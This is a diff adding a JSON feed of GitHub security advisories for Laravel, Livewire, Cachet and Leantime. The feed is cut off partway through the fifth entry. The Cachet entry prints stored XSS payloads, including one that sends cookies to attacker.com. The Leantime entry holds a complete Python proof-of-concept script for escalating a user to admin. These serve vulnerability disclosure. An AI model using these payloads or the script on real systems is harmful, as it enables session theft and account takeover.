@@ -1,0 +1,521 @@
+[
+  {
+    "ghsa_id": "GHSA-f9x3-7vq9-cph6",
+    "cve_id": "CVE-2026-114509",
+    "url": "https://api.github.com/advisories/GHSA-f9x3-7vq9-cph6",
+    "html_url": "https://github.com/advisories/GHSA-f9x3-7vq9-cph6",
+    "summary": "Laravel TokenGuard authentication bypass through non-string API credentials",
+    "description": "Laravel's built-in TokenGuard, **when configured with a standard token-based API guard**, may be bypassed to authenticate as an arbitrary existing user without knowledge of their valid API token. \n\n**Under certain database configurations (MySQL/MariaDB)** an attacker can submit a specially crafted, non-string credential value that is mishandled during the authentication lookup, causing the underlying query to match an unintended user record rather than failing authentication as expected.\n\n### Impact\nAn unauthenticated attacker may authenticate as another user without possessing that user's API token, leading to authentication bypass and account takeover on any route protected by the affected guard.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/laravel/framework/security-advisories/GHSA-f9x3-7vq9-cph6",
+    "source_code_location": "https://github.com/laravel/framework",
+    "identifiers": [
+      {
+        "value": "GHSA-f9x3-7vq9-cph6",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-114509",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-114509",
+      "https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5",
+      "https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c",
+      "https://github.com/laravel/framework/releases/tag/v12.68.0",
+      "https://github.com/laravel/framework/releases/tag/v13.29.0",
+      "https://github.com/advisories/GHSA-f9x3-7vq9-cph6"
+    ],
+    "published_at": "2026-10-23T21:50:27Z",
+    "updated_at": "2026-10-23T21:50:28Z",
+    "github_reviewed_at": "2026-10-23T21:50:27Z",
+    "nvd_published_at": "2026-10-21T22:16:49Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "laravel/framework"
+        },
+        "vulnerable_version_range": ">= 13.0.0, < 13.29.0",
+        "first_patched_version": "13.29.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "laravel/framework"
+        },
+        "vulnerable_version_range": "< 12.68.0",
+        "first_patched_version": "12.68.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "score": 9.2
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-287",
+        "name": "Improper Authentication"
+      },
+      {
+        "cwe_id": "CWE-1287",
+        "name": "Improper Validation of Specified Type of Input"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "KIKOmanasijev",
+          "id": 34198639,
+          "node_id": "MDQ6VXNlcjM0MTk4NjM5",
+          "avatar_url": "https://avatars.githubusercontent.com/u/34198639?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/KIKOmanasijev",
+          "html_url": "https://github.com/KIKOmanasijev",
+          "followers_url": "https://api.github.com/users/KIKOmanasijev/followers",
+          "following_url": "https://api.github.com/users/KIKOmanasijev/following{/other_user}",
+          "gists_url": "https://api.github.com/users/KIKOmanasijev/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/KIKOmanasijev/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/KIKOmanasijev/subscriptions",
+          "organizations_url": "https://api.github.com/users/KIKOmanasijev/orgs",
+          "repos_url": "https://api.github.com/users/KIKOmanasijev/repos",
+          "events_url": "https://api.github.com/users/KIKOmanasijev/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/KIKOmanasijev/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 1,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00696,
+      "percentile": 0.52751
+    }
+  },
+  {
+    "ghsa_id": "GHSA-5wcm-3v2w-8362",
+    "cve_id": "CVE-2026-114508",
+    "url": "https://api.github.com/advisories/GHSA-5wcm-3v2w-8362",
+    "html_url": "https://github.com/advisories/GHSA-5wcm-3v2w-8362",
+    "summary": "Laravel relationship inclusion can trigger unauthorized data destruction",
+    "description": "A vulnerability in how relationship inclusion is processed on certain read endpoints. Under specific conditions, a request to a read-only endpoint can be crafted to trigger a destructive database operation on a related table, rather than simply retrieving data.\n\n### Impact\nA user with only read access could cause irreversible data loss (e.g., a related table being emptied), without needing any write permissions. This could result in denial of service and loss of data integrity for affected applications.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/laravel/framework/security-advisories/GHSA-5wcm-3v2w-8362",
+    "source_code_location": "https://github.com/laravel/framework",
+    "identifiers": [
+      {
+        "value": "GHSA-5wcm-3v2w-8362",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-114508",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/laravel/framework/security/advisories/GHSA-5wcm-3v2w-8362",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-114508",
+      "https://github.com/laravel/framework/pull/61322",
+      "https://github.com/laravel/framework/pull/61323",
+      "https://github.com/laravel/framework/commit/50a7970efe9f9990b6ec4f1e949de2abaaf4263e",
+      "https://github.com/laravel/framework/commit/b89f2944995d555bfda76dced1ef6c6b04ef17d8",
+      "https://github.com/laravel/framework/releases/tag/v12.68.0",
+      "https://github.com/laravel/framework/releases/tag/v13.27.0",
+      "https://github.com/advisories/GHSA-5wcm-3v2w-8362"
+    ],
+    "published_at": "2026-10-23T21:47:48Z",
+    "updated_at": "2026-10-23T21:47:49Z",
+    "github_reviewed_at": "2026-10-23T21:47:48Z",
+    "nvd_published_at": "2026-10-21T22:16:49Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "laravel/framework"
+        },
+        "vulnerable_version_range": ">= 12.45.0, < 12.68.0",
+        "first_patched_version": "12.68.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "laravel/framework"
+        },
+        "vulnerable_version_range": ">= 13.0.0, < 13.27.0",
+        "first_patched_version": "13.27.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+        "score": 6.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-470",
+        "name": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "KIKOmanasijev",
+          "id": 34198639,
+          "node_id": "MDQ6VXNlcjM0MTk4NjM5",
+          "avatar_url": "https://avatars.githubusercontent.com/u/34198639?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/KIKOmanasijev",
+          "html_url": "https://github.com/KIKOmanasijev",
+          "followers_url": "https://api.github.com/users/KIKOmanasijev/followers",
+          "following_url": "https://api.github.com/users/KIKOmanasijev/following{/other_user}",
+          "gists_url": "https://api.github.com/users/KIKOmanasijev/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/KIKOmanasijev/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/KIKOmanasijev/subscriptions",
+          "organizations_url": "https://api.github.com/users/KIKOmanasijev/orgs",
+          "repos_url": "https://api.github.com/users/KIKOmanasijev/repos",
+          "events_url": "https://api.github.com/users/KIKOmanasijev/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/KIKOmanasijev/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+      "score": 6.5
+    },
+    "epss": {
+      "percentage": 0.00406,
+      "percentile": 0.34621
+    }
+  },
+  {
+    "ghsa_id": "GHSA-mhf7-xp6r-6qrc",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-mhf7-xp6r-6qrc",
+    "html_url": "https://github.com/advisories/GHSA-mhf7-xp6r-6qrc",
+    "summary": "Livewire: Authorization bypass in #[Authorize] via reordered parameter keys and #[Json] execution order",
+    "description": "### Impact\n\nThree issues allowed actions protected by the `#[Authorize]` attribute to run against records the current user is not authorized for:\n\n1. **Out-of-order parameter keys on actions.** `#[Authorize]` resolved a model parameter by its array key, while the action itself received parameters positionally. A request sending params as an object with reordered integer keys (e.g. `{\"1\": 2, \"0\": 1}`) could pass authorization with a record the user owns while the action received a different record. With `#[Authorize('delete', 'comment')]` on `deleteComment(Comment $comment)`, a user could delete another user's comment.\n2. **The same issue on event listeners.** Methods using both `#[On]` and `#[Authorize]` with a model parameter were affected in the same way through the `__dispatch` call.\n3. **`#[Json]` methods ran before authorization.** When a method had both `#[Json]` and `#[Authorize]`, the method body executed before the authorization check. The response was still a 403, but any side effects (such as database writes) had already happened.\n\nOnly applications using the `#[Authorize]` attribute are affected: on methods that take model parameters (issues 1 and 2), or on `#[Json]` methods (issue 3). Authorization performed inside the method (e.g. `$this->authorize(...)`) is not affected. Livewire 3.x is not affected.\n\n### Patches\n\nFixed in **v4.4.8**. Call and event parameters must now be a list or use named (string) keys, otherwise the request is rejected, and `#[Json]` methods are authorized before they run.\n\n### Workarounds\n\nUpgrade to v4.4.8. If you can't upgrade right away, call `$this->authorize(...)` inside affected methods instead of relying on the `#[Authorize]` attribute.\n\n### Credits\n\nReported by Yousef Aman ([@yousef-aman](https://github.com/yousef-aman)).",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/livewire/livewire/security-advisories/GHSA-mhf7-xp6r-6qrc",
+    "source_code_location": "https://github.com/livewire/livewire",
+    "identifiers": [
+      {
+        "value": "GHSA-mhf7-xp6r-6qrc",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/livewire/livewire/security/advisories/GHSA-mhf7-xp6r-6qrc",
+      "https://github.com/livewire/livewire/commit/822a4fa9b1e1123691133a2e2eb379a3dab11191",
+      "https://github.com/livewire/livewire/releases/tag/v4.4.8",
+      "https://github.com/advisories/GHSA-mhf7-xp6r-6qrc"
+    ],
+    "published_at": "2026-10-23T20:51:30Z",
+    "updated_at": "2026-10-23T20:51:30Z",
+    "github_reviewed_at": "2026-10-23T20:51:30Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "livewire/livewire"
+        },
+        "vulnerable_version_range": ">= 4.3.0, < 4.4.8",
+        "first_patched_version": "4.4.8",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "score": 6.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-863",
+        "name": "Incorrect Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "yousef-aman",
+          "id": 59014877,
+          "node_id": "MDQ6VXNlcjU5MDE0ODc3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/59014877?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/yousef-aman",
+          "html_url": "https://github.com/yousef-aman",
+          "followers_url": "https://api.github.com/users/yousef-aman/followers",
+          "following_url": "https://api.github.com/users/yousef-aman/following{/other_user}",
+          "gists_url": "https://api.github.com/users/yousef-aman/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/yousef-aman/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/yousef-aman/subscriptions",
+          "organizations_url": "https://api.github.com/users/yousef-aman/orgs",
+          "repos_url": "https://api.github.com/users/yousef-aman/repos",
+          "events_url": "https://api.github.com/users/yousef-aman/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/yousef-aman/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+      "score": 6.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-x397-5hrv-j9m9",
+    "cve_id": "CVE-2026-113712",
+    "url": "https://api.github.com/advisories/GHSA-x397-5hrv-j9m9",
+    "html_url": "https://github.com/advisories/GHSA-x397-5hrv-j9m9",
+    "summary": "Cachet has Stored XSS in Incident Component",
+    "description": "### Summary\nA stored Cross-Site Scripting (XSS) vulnerability exists in the incident creation form, allowing an authenticated attacker to inject malicious HTML/JavaScript that executes in the browser of any user who views the status page, potentially leading to session token theft and account takeover.\n\n### Details\nThe incident Name and Message fields do not properly sanitize HTML  event handler attributes. While <script> tags appear to be filtered, event-based payloads are not blocked.\n\nAffected endpoint: /dashboard/incidents/\nAffected fields: Incident Name, Incident Message\nAffected version: Cachet v3\n\n### PoC\n\n1. Log in as an authenticated user\n2. Navigate to /dashboard/incidents/\n3. Create a new incident\n4. Insert the following payloads in the Name and Message field:\n\nPayload 1 — Confirm XSS execution:\n```<img src=x onerror=\"alert(1)\">```\n\nStep 2 — Cookie/token exfiltration:\n```<img src=x onerror=\"fetch('http://attacker.com/leak?c='+document.cookie)\">```\n\nStep 3 — Forced redirect to sensitive page:\n```<img src=x onerror=\"window.location='/dashboard/manage-customization'\">```\n\n5. Save the incident\n6. Navigate to the public status page\n7. Payload executes in the victim's browser\n### Payload 1 \n<img width=\"1926\" height=\"1062\" alt=\"Screenshot_2026-05-05_21_19_21\" src=\"https://github.com/user-attachments/assets/3ec50987-332d-4ba2-8fd2-b18ccc8d8f6b\" />\n\n### Payload 2\n<img width=\"1910\" height=\"525\" alt=\"Screenshot_2026-05-07_12_22_07\" src=\"https://github.com/user-attachments/assets/3b34170d-a2f0-4962-9e20-1fc8e305c589\" />\n\n\n\nStored XSS affecting all users who view the public status page.\n\nAn attacker can:\n- Confirm script execution via alert popup\n- Steal session cookies and XSRF tokens from authenticated users\n- Silently redirect victims to sensitive pages like `/dashboard/manage-customization`\n\nThis vulnerability could lead to full account takeover of any user who views the status page, including administrators.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/cachethq/cachet/security-advisories/GHSA-x397-5hrv-j9m9",
+    "source_code_location": "https://github.com/cachethq/cachet",
+    "identifiers": [
+      {
+        "value": "GHSA-x397-5hrv-j9m9",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-113712",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/cachethq/cachet/security/advisories/GHSA-x397-5hrv-j9m9",
+      "https://github.com/cachethq/core/commit/23adbb88ffa819f92be4a905ff1d812670d980a2",
+      "https://github.com/cachethq/core/commit/57b44a8bac0b250b0d5751e93e0349070d14606e",
+      "https://github.com/advisories/GHSA-x397-5hrv-j9m9"
+    ],
+    "published_at": "2026-10-20T21:09:40Z",
+    "updated_at": "2026-10-20T21:09:40Z",
+    "github_reviewed_at": "2026-10-20T21:09:40Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "cachethq/cachet"
+        },
+        "vulnerable_version_range": "<= 2.4.1",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+        "score": 4.8
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "MAVERICK-VF142",
+          "id": 113919175,
+          "node_id": "U_kgDOBspExw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/113919175?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/MAVERICK-VF142",
+          "html_url": "https://github.com/MAVERICK-VF142",
+          "followers_url": "https://api.github.com/users/MAVERICK-VF142/followers",
+          "following_url": "https://api.github.com/users/MAVERICK-VF142/following{/other_user}",
+          "gists_url": "https://api.github.com/users/MAVERICK-VF142/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/MAVERICK-VF142/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/MAVERICK-VF142/subscriptions",
+          "organizations_url": "https://api.github.com/users/MAVERICK-VF142/orgs",
+          "repos_url": "https://api.github.com/users/MAVERICK-VF142/repos",
+          "events_url": "https://api.github.com/users/MAVERICK-VF142/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/MAVERICK-VF142/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 2,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.0046,
+      "percentile": 0.39561
+    }
+  },
+  {
+    "ghsa_id": "GHSA-54mm-6729-r5wp",
+    "cve_id": "CVE-2026-85990",
+    "url": "https://api.github.com/advisories/GHSA-54mm-6729-r5wp",
+    "html_url": "https://github.com/advisories/GHSA-54mm-6729-r5wp",
+    "summary": "Leantime: Any Authenticated User Can Self-Escalate to Admin via Unauthorized JSON-RPC Methods",
+    "description": "### Summary\n\nAny authenticated Leantime user - including the lowest-privilege `readonly` role - can escalate to full administrative access by calling the JSON-RPC method `leantime.rpc.api.api.createApiKeyWithProjects` with an attacker-chosen `role` value. The server creates a new account at that role with no authorization check, and the resulting credentials work as a fully interactive admin login through the ordinary web UI. The same root cause (missing per-method authorization on JSON-RPC-exposed service methods) also leaves the `Plugins` service's `installPlugin`, `enablePlugin`, `disablePlugin`, and `removePlugin` methods callable by any authenticated user with no role check, even though their web-UI equivalents correctly require an admin/owner role.\n\n### Details\n\nLeantime's JSON-RPC API (`app/Domain/Api/Controllers/Jsonrpc.php`) reflects any public method on any `@api`-annotated service class and dispatches it at `leantime.rpc.{domain}.{service}.{method}`. Per-method authorization is enforced by `PermissionEnforcer::enforce()` (`app/Core/Auth/Permissions/PermissionEnforcer.php`), which reads a `#[RequiresPermission(...)]` PHP attribute off the target method - but when that attribute is **absent**, `enforce()` silently returns and allows the call through.\n\n`Api::createApiKeyWithProjects(array $values, ?array $projects)` (`app/Domain/Api/Services/Api.php`) is `@api`-exposed and carries no `#[RequiresPermission]` attribute. It forwards `$values` - including a caller-supplied `role` - directly into `createAPIKey()` → `Users\\Repositories\\Users::addUser()`, with no server-side clamping of `role` against the calling user's own privilege level:\n\n```php\n// app/Domain/Api/Services/Api.php\n/**\n * @api\n */\npublic function createApiKeyWithProjects(array $values, ?array $projects): array|false\n{\n    $apiKeyValues = $this->createAPIKey($values);   // no #[RequiresPermission], no role check\n    ...\n}\n```\n\nThe equivalent web route (`NewApiKey` controller) correctly gates account creation behind an admin-only role check (`Auth::authOrRedirect([Roles::$admin, ...])`), but that gate is bypassed entirely by calling the service directly through JSON-RPC.\n\nSeparately, `Plugins::installPlugin()`, `enablePlugin()`, `disablePlugin()`, and `removePlugin()` (`app/Domain/Plugins/Services/Plugins.php`, lines ~266/299/320/342) share the same gap: all four are `@api`-exposed with no `#[RequiresPermission]`, while their web-controller equivalents (`Myapps.php`, `Details.php`) correctly require `Roles::$owner`/`Roles::$admin`.\n\nAuthenticating to the JSON-RPC endpoint with an ordinary browser session cookie (rather than a dedicated API key) is sufficient, provided the request carries an `X-Requested-With: XMLHttpRequest` header (`app/Core/Middleware/StartSession.php`) - this is exactly what the application's own first-party JS client already sends, so no special tooling beyond a normal authenticated session is needed.\n\n### PoC\n\nA runnable Python PoC (`requests` library only) reproduces this end-to-end; see the attached `poc.py`. Steps:\n\n1. Create/authenticate as a `readonly`-role account (the lowest privilege level). Confirm it is correctly blocked (HTTP 403) from an admin-only page, e.g. `/plugins/myapps`.\n2. From that same low-privilege session, send:\n   ```\n   POST /api/jsonrpc\n   Content-Type: application/json\n   X-Requested-With: XMLHttpRequest\n\n   {\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"leantime.rpc.api.api.createApiKeyWithProjects\",\n    \"params\":{\"values\":{\"firstname\":\"poc\",\"role\":40,\"status\":\"a\"},\"projects\":[]}}\n   ```\n   The server responds `HTTP 200` with the newly created account's `user`/`passwordClean` and `\"role\":40` (admin) in the JSON body.\n3. Log in through the normal `/auth/login` form using the returned `user`/`passwordClean`. The resulting session now has full, interactive access to `/plugins/myapps` (HTTP 200) - the exact page that returned 403 in step 1.\n\nReproduced against a local instance built from this repository's own `.dev` Docker tooling (`.dev/docker-compose.yaml`), with dependencies installed via `composer install` / `npx mix` and no modifications to application code.\n\n### Impact\n\nComplete compromise of any Leantime instance by an attacker who controls, or can register/be granted, any authenticated account - including the lowest-privilege `readonly` role. No admin credentials, tokens, or prior access beyond an ordinary low-privilege login are required. This is a full authenticated-to-admin privilege escalation (CWE-862 Missing Authorization, CWE-269 Improper Privilege Management). Combined with the plugin-management gap described above, it further extends to arbitrary plugin install/enable/disable/remove, a path toward code-execution-level impact tracked from the same root cause.\n\nScript : poc.py\n```python\n#!/usr/bin/env python3\n\"\"\"\nWhat this script does, against a target Leantime instance:\n  1. Logs in as a LOW-PRIVILEGE account (readonly role by default).\n  2. Confirms the account is correctly blocked by the normal web UI from an\n     admin-only page (expects HTTP 403) -- this establishes the account truly\n     has no admin rights before the exploit runs.\n  3. Calls leantime.rpc.api.api.createApiKeyWithProjects over JSON-RPC using\n     nothing but that account's own ordinary session cookie, requesting\n     role=40 (admin). No admin/API-key credential is used anywhere in this\n     step -- only the low-privilege session established in step 1.\n  4. Logs in through the completely ordinary web login form using the\n     generated username/password from step 3, and confirms that account now\n     has full, interactive admin access to the same admin-only page that\n     blocked the original low-privilege account in step 2. (The record is\n     created with source='' rather than source='api' -- createAPIKey() never\n     sets that column -- so it does NOT work as an x-api-key credential, but\n     it is a fully functional role=40 web login, which is a stronger and\n     more direct proof of impact.)\n\nRequirements: pip install requests\n\nUsage:\n  python3 poc.py --url http://localhost:5080 \\\\\n      --username lowpriv@leantime.test --password 'LowPriv123!'\n\"\"\"\n\nimport argparse\nimport sys\n\nimport requests\n\n\ndef rpc_call(session: requests.Session, base_url: str, method: str, params: dict, extra_headers: dict | None = None):\n    \"\"\"Call a JSON-RPC method. Sends X-Requested-With so the session-based\n    guard actually loads the caller's real, persisted session (see\n    StartSession.php:65) -- without it, API requests get a fresh, empty,\n    in-memory session and every call 401s regardless of login state.\"\"\"\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"X-Requested-With\": \"XMLHttpRequest\",\n    }\n    if extra_headers:\n        headers.update(extra_headers)\n\n    resp = session.post(\n        f\"{base_url}/api/jsonrpc\",\n        json={\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": method, \"params\": params},\n        headers=headers,\n    )\n    return resp\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)\n    parser.add_argument(\"--url\", required=True, help=\"Base URL of the target Leantime instance, e.g. http://localhost:5080\")\n    parser.add_argument(\"--username\", required=True, help=\"Email of a LOW-privilege test account (e.g. readonly role)\")\n    parser.add_argument(\"--password\", required=True, help=\"Password for that account\")\n    parser.add_argument(\"--admin-check-path\", default=\"/plugins/myapps\", help=\"An admin-only web page used to confirm the account has no admin rights (default: /plugins/myapps)\")\n    parser.add_argument(\"--insecure\", action=\"store_true\", help=\"Disable TLS verification (for self-signed local/dev instances)\")\n    args = parser.parse_args()\n\n    verify = not args.insecure\n    base_url = args.url.rstrip(\"/\")\n    s = requests.Session()\n    s.verify = verify\n\n    print(f\"[*] Target: {base_url}\")\n\n    # Step 1: log in as the low-privilege account via the ordinary web form.\n    print(f\"[*] Logging in as low-privilege account: {args.username}\")\n    s.get(f\"{base_url}/auth/login\")  # prime session cookie\n    login_resp = s.post(\n        f\"{base_url}/auth/login\",\n        data={\n            \"username\": args.username,\n            \"password\": args.password,\n            \"redirectUrl\": \"/dashboard/home\",  # avoid the unrelated empty-redirectUrl 500 bug\n        },\n        allow_redirects=False,\n    )\n    if login_resp.status_code not in (302, 303):\n        print(f\"[!] Login did not redirect as expected (got {login_resp.status_code}). Aborting.\")\n        sys.exit(1)\n    print(\"[+] Login succeeded (session cookie established).\")\n\n    # Step 2: confirm the account genuinely has no admin rights via the web UI.\n    check_resp = s.get(f\"{base_url}{args.admin_check_path}\", allow_redirects=False)\n    if check_resp.status_code == 403:\n        print(f\"[+] Confirmed: web UI correctly blocks this account from {args.admin_check_path} (HTTP 403).\")\n    else:\n        print(f\"[!] Expected HTTP 403 from {args.admin_check_path}, got {check_resp.status_code}. \"\n              f\"Continuing anyway, but this account may not be low-privilege as assumed.\")\n\n    # Step 3: the actual privilege escalation -- same session, no API key used.\n    print(\"[*] Calling leantime.rpc.api.api.createApiKeyWithProjects with role=40 (admin) \"\n          \"using ONLY the low-privilege session from step 1 ...\")\n    esc_resp = rpc_call(\n        s,\n        base_url,\n        \"leantime.rpc.api.api.createApiKeyWithProjects\",\n        {\"values\": {\"firstname\": \"poc-escalated-admin-key\", \"role\": 40, \"status\": \"a\"}, \"projects\": []},\n    )\n\n    try:\n        esc_json = esc_resp.json()\n    except ValueError:\n        print(f\"[!] Non-JSON response (HTTP {esc_resp.status_code}): {esc_resp.text[:500]}\")\n        sys.exit(1)\n\n    if \"error\" in esc_json:\n        print(f\"[!] Exploit call failed: {esc_json['error']}\")\n        print(\"    (If this is 'Method is not available via API' or an AuthorizationException, \"\n              \"the target may already be patched.)\")\n        sys.exit(1)\n\n    result = esc_json[\"result\"]\n    new_user = result[\"user\"]\n    new_pass = result[\"passwordClean\"]\n    new_role = result[\"role\"]\n    new_id = result[\"id\"]\n    api_key = f\"lt_{new_user}_{new_pass}\"\n\n    print(\"[+] VULNERABLE: server created a new account with attacker-chosen role, \"\n          \"with no permission check on the calling (low-privilege) account.\")\n    print(f\"    New account id={new_id}  role={new_role} (40 == admin)\")\n    print(f\"    Generated credentials -- username: {new_user}  password: {new_pass}\")\n    print(f\"    (Nominal API key form: {api_key} -- see note below.)\")\n\n    # Step 4: prove the new account carries real, interactive admin privilege\n    # by logging in through the ORDINARY web login form and hitting the same\n    # admin-only page that blocked the original low-privilege account.\n    print(\"[*] Logging in through the normal web UI with the generated credentials ...\")\n    admin_session = requests.Session()\n    admin_session.verify = verify\n    admin_session.get(f\"{base_url}/auth/login\")\n    admin_login_resp = admin_session.post(\n        f\"{base_url}/auth/login\",\n        data={\"username\": new_user, \"password\": new_pass, \"redirectUrl\": \"/dashboard/home\"},\n        allow_redirects=False,\n    )\n    if admin_login_resp.status_code not in (302, 303):\n        print(f\"[!] Web login with generated credentials failed (HTTP {admin_login_resp.status_code}).\")\n        sys.exit(1)\n\n    admin_check_resp = admin_session.get(f\"{base_url}{args.admin_check_path}\", allow_redirects=False)\n    if admin_check_resp.status_code == 200:\n        print(f\"[+] CONFIRMED: the account created by a LOW-PRIVILEGE user now has full, \"\n              f\"interactive admin access to {args.admin_check_path} (HTTP 200) -- \"\n              f\"the exact page that returned 403 for the original account in step 2.\")\n    else:\n        print(f\"[!] Expected HTTP 200 from {args.admin_check_path} with the escalated account, \"\n              f\"got {admin_check_resp.status_code}.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n---\n\n**Maintainer note (resolution):** Addressed by the native permission engine (v3.9.0): the affected JSON-RPC service methods now carry #[RequiresPermission] and are enforced at the API boundary (users/clients/projects mutations require the appropriate permission; self-escalation via editUser/patchUser is blocked). Remaining gates ship in the upcoming release.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/Leantime/leantime/security-advisories/GHSA-54mm-6729-r5wp",
+    "source_code_location": "https://github.com/Leantime/leantime",
+    "identifiers": [
+      {
+        "value": "GHSA-54mm-6729-r5wp",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-85990",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/Leantime/leantime/security/advisories/GHSA-54mm-6729-r5wp",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-85990",
+      "https://github.com/Leantime/leantime/pull/3583",
+      "https://github.com/Leantime/leantime/pull/3797",
+      "https://github.com/Leantime/leantime/commit/5605e5ee86bbd01acb85c6b5d8fb337faf8bcf02",
+      "https://github.com/Leantime/leantime/commit/7ebf7a9517e2aaa05ec15b8130ab1841a4bde43e",
+      "https://github.com/Leantime/leantime/releases/tag/v3.10.0",
+      "https://github.com/advisories/GHSA-54mm-6729-r5wp"
+    ],
+    "published_at": "2026-10-15T20:14:43Z",
+    "updated_at": "2026-10-15T20:14:44Z",
+    "github_reviewed_at": "2026-10-15T20:14:43Z",
+    "nvd_published_at": "2026-10-13T17:17:47Z",
